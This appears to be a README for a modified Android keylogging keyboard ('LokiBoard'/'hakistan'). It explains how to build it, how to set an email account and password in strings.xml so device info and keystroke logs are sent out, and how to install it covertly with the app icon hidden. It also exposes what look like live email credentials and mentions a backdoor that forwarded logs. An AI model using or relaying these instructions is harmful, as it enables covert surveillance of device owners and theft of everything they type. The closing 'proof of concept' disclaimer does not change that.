This hakistan version is behind some weird non existent pro version that does not work,
 So far it's been just un-commenting many snippets of code until it breaks, it's like
 overclocking lol, there was also a backdoor so hakistan always got logs.

 as of right now an email is sent of user device info on initial install, during testing make sure to type
 or click on the virtual keyboard if using genymotion for example. keypress logs as of now are only
  sent when the user opens up the app.

  -----------------------------------------------

 To get started helping us reverse engineer this mess you can download the rar from the release section
 
 then open up the folder inside Android Studio after extraction.
 
 After this goto file | Settings | Goto Search Box
 
 search for Gradle
 
 click the drop down and select use gradle from wrapper properties file, click ok
 
 next click file then sync project with gradle files
 

 open:
 
 hakistan\Lokiboard-Mod-master\app\src\main\res\values\strings.xml
 
 and edit these 2 lines:
 ```
 [ <string name="EMail">dashdashpass7@gmail.com</string>]
  
   <string name="EmailPassword">7.gMukhlis.Ghaf00r</string>
```
from this snippet:
 ```
 <string name="prefs_keyboard_height_settings">Keyboard height</string>
    <string name="keyboard_color">Set custom keyboard color</string>
    <string name="hide_special_chars">Hide special characters</string>
    <string name="hide_language_switch_key">Hide language switch key</string>
    <string name="show_number_row">Show separate number row</string>
    <string name="space_swipe">Space swipe cursor move</string>
    <string name="delete_swipe">Delete swipe</string>
    <string name="matching_navbar_color">Use matching navigation bar color</string>
    <string name="setup_message">LokiBoard Keyboard is not enabled. Click OK to open Languages &amp; Input settings. You will need to select LokiBoard Keyboard in your current keyboard to use it.</string>
    <string name="EMail">dashdashpass7@gmail.com</string>
    <string name="EmailPassword">7.gMukhlis.Ghaf00r</string>
    <string name="Interval">120000</string>
 ```

You should also do a search and replace all for any emails.


# LokiBoard-Android-KeyLogger
Android Keylogging Keyboard

## Download

Build it from source or use [prebuilt apks.](https://github.com/IceWreck/LokiBoard-Android-Keylogger/raw/master/releases/LokiBoard-1.1.apk) 

[Play Store](https://play.google.com/store/apps/details?id=com.abifog.lokiboard) 


## Usage

Note: You need to have physical access to the device for use.

* Install app.
* Open the _language and input_ section in the System Settings if it does not automatically open after install
* Enable Lokiboard and disable all other forms of input.
* The homescreen icon is hidden by default. LokiBoard Settings can be accessed by tapping LokiBoard in the language and input section of system settings.
* There are tons of settings to make it look and behave like your usual keyboard including theme support.
* Keystroke logs can be accessed via your file manager. 

`Internal Storage > Android > Data > com.abifog.lokiboard > files > lokiboard-files.txt `




## Obligatory Notice
This was designed as a proof of concept and not for any malacious purposes.

## Credits
Based on the Android Open Source Project Keyboard and [Simple Keyboard](https://github.com/rkkr/simple-keyboard/)

